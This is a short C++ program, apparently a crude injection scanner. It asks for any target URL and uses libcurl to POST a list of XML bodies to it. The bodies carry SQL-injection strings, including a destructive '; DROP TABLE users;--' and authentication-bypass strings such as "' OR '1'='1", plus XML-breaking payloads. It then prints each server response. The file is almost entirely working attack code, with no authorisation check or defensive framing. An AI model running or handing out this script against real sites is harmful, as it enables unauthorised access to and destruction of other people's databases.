#include <iostream>
#include <string>
#include <vector>
#include <curl/curl.h>

// ANSI escape codes for text color
#define ANSI_COLOR_RED     "\x1b[31m"
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_RESET   "\x1b[0m"

// Callback function to handle HTTP response
size_t writeCallback(void* ptr, size_t size, size_t nmemb, std::string* data) {
    data->append((char*)ptr, size * nmemb);
    return size * nmemb;
}

// Function to perform HTTP request
CURLcode performRequest(const std::string& url, const std::string& xmlPayload, std::string& responseString) {
    CURL* curl = curl_easy_init();
    if (!curl) {
        return CURLE_FAILED_INIT;
    }

    // Set the target URL
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

    // Set the POST data (XML payload)
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, xmlPayload.c_str());

    // Set the HTTP POST method
    curl_easy_setopt(curl, CURLOPT_POST, 1L);

    // Set callback function to handle response
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &responseString);

    // Set timeout to avoid hanging
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

    // Perform the HTTP request
    CURLcode res = curl_easy_perform(curl);

    // Clean up libcurl resources
    curl_easy_cleanup(curl);

    return res;
}

int main() {
    // Initialize libcurl
    curl_global_init(CURL_GLOBAL_ALL);

    // Prompt user for the target URL
    std::string targetUrl;
    std::cout << "Enter the target website URL (including protocol, e.g., http://example.com): ";
    std::cin >> targetUrl;

    // Validate the input URL
    if (targetUrl.empty()) {
        std::cerr << ANSI_COLOR_RED << "Invalid target URL" << ANSI_COLOR_RESET << std::endl;
        curl_global_cleanup();
        return 1;
    }

    // Check if the URL starts with 'http://' or 'https://', and add if missing
    if (targetUrl.find("http://") != 0 && targetUrl.find("https://") != 0) {
        targetUrl = "http://" + targetUrl;
    }

    // Define the list of XML payloads with injections
    std::vector<std::string> payloads = {
        "<user><name>John</name><password>'; DROP TABLE users;--</password></user>",
        "<user><name>John</name><password>' OR '1'='1</password></user>",
        "<user><name>John</name><password>' OR 1=1--</password></user>",
        "<user><name>John</name><password>]]></password></user>",
        "<user><name>John</name><password>&lt;/password&gt;&lt;password&gt;hacked&lt;/password&gt;</password></user>",
        // Add more payloads here
    };

    // Perform HTTP requests with each payload
    for (const auto& payload : payloads) {
        // Perform the HTTP request
        std::string responseString;
        CURLcode res = performRequest(targetUrl, payload, responseString);

        // Check the result of the HTTP request
        if (res != CURLE_OK) {
            std::cerr << ANSI_COLOR_RED << "Failed to perform HTTP request with payload: " << curl_easy_strerror(res) << ANSI_COLOR_RESET << std::endl;
            continue;
        }

        // Display the response
        std::cout << ANSI_COLOR_GREEN << "Response for payload:\n" << payload << "\n\n" << responseString << ANSI_COLOR_RESET << std::endl;
    }

    // Clean up libcurl resources
    curl_global_cleanup();

    return 0;
}
